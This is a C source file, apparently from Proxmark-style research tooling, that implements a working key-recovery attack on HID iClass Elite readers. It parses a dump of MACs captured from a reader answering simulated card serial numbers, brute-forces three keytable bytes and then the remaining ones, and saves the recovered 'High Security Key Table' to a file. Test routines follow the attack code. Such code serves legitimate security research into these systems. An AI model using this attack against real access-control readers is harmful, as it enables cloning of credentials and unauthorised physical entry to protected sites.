#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <cipherutils.h>
#include <stdio.h>
#include <time.h>
#include "key_attack.h"
#include "cipher.h"
#include "ikeys.h"
#include "elite_crack.h"
#include "fileutils.h"
/**
 * @brief Permutes a key from standard NIST format to Iclass specific format
 * @param key
 * @param dest
 */
void permutekey(uint8_t key[8], uint8_t dest[8])
{

	/**
	from http://www.proxmark.org/forum/viewtopic.php?pid=11220#p11220

	If you permute [6c 8d 44 f9 2a 2d 01 bf]  you get  [8a 0d b9 88 bb a7 90 ea]  as shown below.

	1 0 1 1 1 1 1 1  bf
	0 0 0 0 0 0 0 1  01
	0 0 1 0 1 1 0 1  2d
	0 0 1 0 1 0 1 0  2a
	1 1 1 1 1 0 0 1  f9
	0 1 0 0 0 1 0 0  44
	1 0 0 0 1 1 0 1  8d
	0 1 1 0 1 1 0 0  6c

	8 0 b 8 b a 9 e
	a d 9 8 b 7 0 a

	**/
	int i;
	for(i = 0 ; i < 8 ; i++)
	{
		dest[i] =	(((key[7] & (0x80 >> i)) >> (7-i)) << 7) |
					(((key[6] & (0x80 >> i)) >> (7-i)) << 6) |
					(((key[5] & (0x80 >> i)) >> (7-i)) << 5) |
					(((key[4] & (0x80 >> i)) >> (7-i)) << 4) |
					(((key[3] & (0x80 >> i)) >> (7-i)) << 3) |
					(((key[2] & (0x80 >> i)) >> (7-i)) << 2) |
					(((key[1] & (0x80 >> i)) >> (7-i)) << 1) |
					(((key[0] & (0x80 >> i)) >> (7-i)) << 0);
	}

	return;
}
/**
 * Permutes  a key from iclass specific format to NIST format
 * @brief permutekey_rev
 * @param key
 * @param dest
 */
void permutekey_rev(uint8_t key[8], uint8_t dest[8])
{
	int i;
	for(i = 0 ; i < 8 ; i++)
	{
		dest[7-i] =	(((key[0] & (0x80 >> i)) >> (7-i)) << 7) |
					(((key[1] & (0x80 >> i)) >> (7-i)) << 6) |
					(((key[2] & (0x80 >> i)) >> (7-i)) << 5) |
					(((key[3] & (0x80 >> i)) >> (7-i)) << 4) |
					(((key[4] & (0x80 >> i)) >> (7-i)) << 3) |
					(((key[5] & (0x80 >> i)) >> (7-i)) << 2) |
					(((key[6] & (0x80 >> i)) >> (7-i)) << 1) |
					(((key[7] & (0x80 >> i)) >> (7-i)) << 0);
	}
}
/**
 * @brief Reads data from the iclass-reader-attack dump file.
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
		<8 byte CSN><4 byte NR><4 byte MAC>
		.. 126 times...
 * @param cc_nr an array to store cc_nr into (12 bytes)
 * @param csn an arracy ot store CSN into (8 bytes)
 * @param received_mac an array to store MAC into (4 bytes)
 * @param i the number to read. Should be less than 127, or something is wrong...
 * @return
 */
int _readFromDump(uint8_t dump[], uint8_t cc_nr[], uint8_t csn[], uint8_t received_mac[], int i)
{
	if(i  > 127){
		printf("Error, i > 127, bad things will happen... \n");
		return 1;
	}

	uint8_t key_index[] = {0};

	iclass_attack attack = get_attack_data(i);
	memcpy(csn, attack.simulated_csn, 8);
	memcpy(key_index, attack.key_indices, 8);
	if(memcmp(csn, dump+i*16, 8) != 0)
	{
		printf("Something is wrong. \nExpected CSN: %02x%02x%02x%02x%02x%02x%02x%02x\nFound CSN:   %02x%02x%02x%02x%02x%02x%02x%02x",
				csn[0],csn[1], csn[2],csn[3],csn[4],csn[5], csn[6],csn[7],
				dump[i*16],	dump[i*16+1],dump[i*16+2],dump[i*16+3],
				dump[i*16+4],dump[i*16+5],dump[i*16+6],dump[i*16+7]);
		return 1;
	}
	// Load NR (cc is eight zeroes)
	cc_nr[8] = *(dump+i*16+8);
	cc_nr[9] = *(dump+i*16+8+1);
	cc_nr[10] = *(dump+i*16+8+2);
	cc_nr[11] =	*(dump+i*16+8+3);

	// Load MAC
	memcpy(received_mac, dump+i*16+12, 4);
	if(false)
	{
		printvar("csn", csn,8);
		printvar("cc_nr", cc_nr,12);
		printvar("mac", received_mac,4);
	}

	return 0;
}

int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4], uint8_t keytable[]);
/**
 * @brief Bruteforce calculation of the first three bytes (actually, bytes 0x00, 0x01 and 0x45)
 * This method performs up to 2^28 tests to find the three bytes in in the keytable.
 *
 * This method assumes that the CSN used was  '000B0FFFF7FF12E0'
 *- since this CSN gives the HASH value of 0101000045014545, thus solely depending on three bytes
 *from the 128-byte keytable. The CC used is expected to be {0,0,0,0,0,0,0,0}
 * @param dump, data from a iclass reader attack dump.  The format of the dumpdata is expected to be as follows:
		<8 byte CSN><4 byte NR><4 byte MAC>
		.. 126 times...

 * @param keytable, where to write the found values. Should be 128 byte array of uint8's.
 */
int bruteforceThreeBytes(uint8_t dump[], uint8_t keytable[])
{

	// Some required storeage
	// CSN - card csn
	uint8_t csn[8] = { 0 };
	// CC and NR : Card challenge (all zeroes: 8 Bytes) and Reader Nonce (4 Bytes)
	uint8_t cc_nr [12] = {0};
	// The obtained MAC code
	uint8_t received_mac[4] = {0};
	// Load data from dump
	_readFromDump(dump, cc_nr, csn, received_mac,0);
	return _bruteforceThreeBytes(cc_nr, csn, received_mac, keytable );

}
int _bruteforceThreeBytes(	uint8_t cc_nr[],uint8_t csn[], uint8_t received_mac[4], uint8_t keytable[])
{

	// CSN				HASH1 (CSN)
	//000B0FFFF7FF12E0	0101000045014545
	//hash1 =  01 01 00 00 45 01 45 45

	// Selected key, the key which is up for testing
	uint8_t key_sel[8] = {0};
	// Iclass-permuted version of the key
	uint8_t key_sel_p[8] = { 0 };
	// Diversified key
	uint8_t div_key[8] = {0};
	// Where to store calculated MAC.
	uint8_t calculated_MAC[4] = { 0 };

	uint8_t b0 = 0, b1 =0 ,b45 =0;
	b0=0x00;
	int dbg = 0;
	/**
	  Debug run:

	key_sel = fefe000000fe0000
	key_sel_p = 00c4c4c4c4c4c4c4
	kd = c9c7ee6e7d54e5a0
	cc_nr = 0000000000000000a97dded0
	mac = 6f22b5ab

	**/
	do {
		b1=00;
		do {
			b45=0;
			do {
				//key_sel = {b1,b1,b0,b0,b45,b1,b45,b45};
				key_sel[0] = b1;
				key_sel[1] = b1;
				key_sel[2] = b0;
				key_sel[3] = b0;
				key_sel[4] = b45;
				key_sel[5] = b1;
				key_sel[6] = b45;
				key_sel[7] = b45;
				//the key_sel is now on iclass-format
				// We need it on standard format, so reverse permute:
				permutekey_rev(key_sel,key_sel_p);

				diversifyKey(csn, key_sel_p, div_key);

				doMAC(cc_nr, div_key,calculated_MAC);
				if(dbg)
				{
					printvar("key_sel", key_sel,8);
					printvar("key_sel_p", key_sel_p,8);
					printvar("kd", div_key,8);
					printvar("cc_nr", cc_nr,12);
					printvar("mac", calculated_MAC,4);
				}
				if(memcmp(calculated_MAC, received_mac, 4) == 0)
				{
					keytable[0x0] = b0;
					keytable[0x1] = b1;
					keytable[0x45] = b45;
					printf("Found! 0x00,0x01,0x45 = [0x%02x,0x%02x,0x%02x]\n", b0,b1,b45);
					return 0;
				}

			} while (b45++ != 255);
		} while (b1++ != 255);
		printf("%d ", b0);
		fflush(stdout);
	} while (b0++ != 255);

	return 1;
}

/**
 * @brief Performs brute force attack against the remaining 126 bytes after the initial 2^24-attack has
 * recovered three bytes already. This attack runs considerably faster; 126 * 256 (max) diversify+MAC
 * calculations.
 * @param dump The dumpdata from iclass reader attack.
 * @param keytable where to write found values.
 * @return
 */
int bruteforceRemaining(uint8_t dump[], uint8_t keytable[])
{


	int i;
	uint8_t csn[8] = { 0 };
	uint8_t *key_index;
	uint8_t recovery_byte = 0;
	uint8_t key_sel_p[8] = { 0 };
	uint8_t div_key[8] = {0};
	int found = false;
	uint8_t cc_nr [12] = {0};
	uint8_t received_mac[4] = {0};
	uint8_t key_sel[8] = {0};
	uint8_t calculated_MAC[4] = { 0 };
	// We start at index 1!! At zero is the three-byte attack
	for(i =1 ; i <= 125; i++)
	{

		_readFromDump(dump, cc_nr, csn, received_mac, i);
		iclass_attack attack_data = get_attack_data(i);
		recovery_byte = attack_data.recovered_keybyte;
		key_index = attack_data.key_indices;

		uint8_t b = 0;

		do{
			//Set the byte to recover to b
			keytable[attack_data.recovered_keybyte] = b;

			// The indices points to where to fetch data from the keytable from
			//Take values from keytable and place into our key
			key_sel[0] = keytable[key_index[0]];
			key_sel[1] = keytable[key_index[1]];
			key_sel[2] = keytable[key_index[2]];
			key_sel[3] = keytable[key_index[3]];
			key_sel[4] = keytable[key_index[4]];
			key_sel[5] = keytable[key_index[5]];
			key_sel[6] = keytable[key_index[6]];
			key_sel[7] = keytable[key_index[7]];

			//Permute from iclass format to standard format
			permutekey_rev(key_sel,key_sel_p);
			//Diversify
			diversifyKey(csn, key_sel_p, div_key);
			//Calc mac
			doMAC(cc_nr, div_key,calculated_MAC);
			if(false)
			{
				printvar("keysel",key_sel,8);
				printvar("[0x59]MAC",calculated_MAC,4);
			}
			if(memcmp(calculated_MAC, received_mac, 4) == 0)
			{
				printf("[0x%02x:0x%02x]", recovery_byte, b);
				found = true;
				break;
			}
		}while(b++ != 255);

		if(! found)
		{
			printf("Failed to recover byte 0x%02x\n", recovery_byte);
			return 1;
		}
		found = false;
	}
	printf("\n");
	saveFile("iclass_keytable_dump", "bin", keytable, 128);
	return 0;
}


// ---------------------------------------------------------------------------------
// ALL CODE BELOW THIS LINE IS PURELY TESTING
// ---------------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// TEST CODE BELOW
// ----------------------------------------------------------------------------

int _testBruteforce()
{

	// First test
	printf("[+] Testing three-byte crack from known values...\n");
	if(false){
		clock_t t1 = clock();
		uint8_t cc_nr[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa9,0x7d,0xde,0xd0};
		uint8_t csn[8] = { 0x00,0x0b,0x0f,0xff,0xf7,0xff,0x12,0xe0 };
		uint8_t received_mac[] = {0xdd,0x98,0xae,0x0e};
		uint8_t keytable[128] = {0};
		_bruteforceThreeBytes(cc_nr, csn, received_mac,keytable);
		clock_t t2 = clock();

		float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
		printf("\nPerformed three-byte crack in %f seconds\n",diff);

	}

	// First test
	printf("[+] Testing crack from dumpfile...\n");
	{
		uint8_t keytable[128] = {0};
		char * filename = "iclass_dump.bin";
		uint8_t dump[128*(8+4+4)] = {0};
		if( loadFile(filename, dump, sizeof(dump)))
		{
			printf("Failed to load dump-file (%s)\n" , filename);
			return 1;
		}
		printf("[+] Loaded dump file %s\n", filename);
		clock_t t1 = clock();
		bruteforceThreeBytes(dump,keytable);
		bruteforceRemaining(dump, keytable);
		clock_t t2 = clock();
		float diff = (((float)t2 - (float)t1) / CLOCKS_PER_SEC );
		printf("\nPerformed full crack in %f seconds\n",diff);
		printarr_human_readable("High Security Key Table", keytable, 128);

	}
	return 0;
}

int _test_iclass_key_permutation()
{
	uint8_t testcase[8] = {0x6c,0x8d,0x44,0xf9,0x2a,0x2d,0x01,0xbf};
	uint8_t testcase_output[8] = {0};
	uint8_t testcase_output_correct[8] = {0x8a,0x0d,0xb9,0x88,0xbb,0xa7,0x90,0xea};
	uint8_t testcase_output_rev[8] = {0};
	permutekey(testcase, testcase_output);
	permutekey_rev(testcase_output, testcase_output_rev);


	if(memcmp(testcase_output, testcase_output_correct,8) != 0)
	{
		printf("Error with iclass key permute!\n");
		printarr("testcase_output", testcase_output, 8);
		printarr("testcase_output_correct", testcase_output_correct, 8);
		return 1;

	}
	if(memcmp(testcase, testcase_output_rev, 8) != 0)
	{
		printf("Error with reverse iclass key permute\n");
		printarr("testcase", testcase, 8);
		printarr("testcase_output_rev", testcase_output_rev, 8);
		return 1;
	}
	printf("[+] Iclass key permutation OK!\n");
	return 0;
}

int testElite()
{
	printf("[+] Testing iClass Elite functinality...");
	printf("[+] Testing key diversification ...\n");

	int errors = 0 ;
	errors +=_test_iclass_key_permutation();
	errors += _testBruteforce();
	return errors;

}
